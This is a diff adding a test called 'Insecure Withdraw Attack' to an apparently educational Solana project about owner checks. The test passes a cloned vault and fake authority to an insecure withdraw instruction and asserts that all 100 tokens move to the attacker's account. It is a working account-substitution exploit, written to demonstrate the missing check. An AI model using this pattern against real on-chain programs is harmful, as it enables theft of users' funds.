@@ -104,4 +104,26 @@ describe("solana-owner-checks-starter", () => {
             vaultClone,
         ]);
     });
+
+    it("Insecure Withdraw Attack", async () => {
+        let tx = await program.methods
+            .insecureWithdraw()
+            .accounts({
+                vault: vaultClone.publicKey, // 攻击者的vault账户
+                withdrawDestination: withdrawDestinationFake,
+                authority: walletFake.publicKey,
+                // tokenAccount: tokenPDA,
+            })
+            .transaction();
+
+        await web3.sendAndConfirmTransaction(connection, tx, [walletFake]);
+
+        const balance = await connection.getTokenAccountBalance(tokenPDA);
+        expect(balance.value.uiAmount).to.eq(0);
+
+        const hack_balance = await connection.getTokenAccountBalance(
+            withdrawDestinationFake
+        );
+        expect(hack_balance.value.uiAmount).to.eq(100);
+    });
 });
